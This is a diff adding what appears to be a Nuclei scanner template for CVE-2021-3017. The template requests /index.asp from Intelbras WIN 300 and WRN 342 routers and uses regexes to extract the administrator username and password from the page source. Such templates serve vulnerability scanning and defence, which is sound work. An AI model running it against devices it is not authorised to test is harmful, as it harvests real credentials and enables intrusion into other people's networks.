@@ -1,0 +1,40 @@
+id: intelbras-wireless-info-leakage
+info:
+  name: Intelbras Wireless Information Leakage
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    The web interface on Intelbras WIN 300 and WRN 342 devices through 2021-01-04 allows remote attackers to discover credentials by reading the def_wirelesspassword line in the HTML source code.
+  tags: information-disclosure
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-3017
+    - https://www.intelbras.com/pt-br/ajuda-download/faq/roteador-wireless-veloz-wrn-342
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cve-id: CVE-2021-3017
+    cwe-id: CWE-200
+http:
+  - raw:
+      - |
+        GET /index.asp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "def_PPW = \"(.+?)\";"
+    extractors:
+      - type: regex
+        name: username
+        group: 1
+        regex:
+          - "def_PUN = \"(.*?)\";"
+      - type: regex
+        name: password
+        group: 1
+        regex:
+          - "def_PPW = \"(.*?)\";"
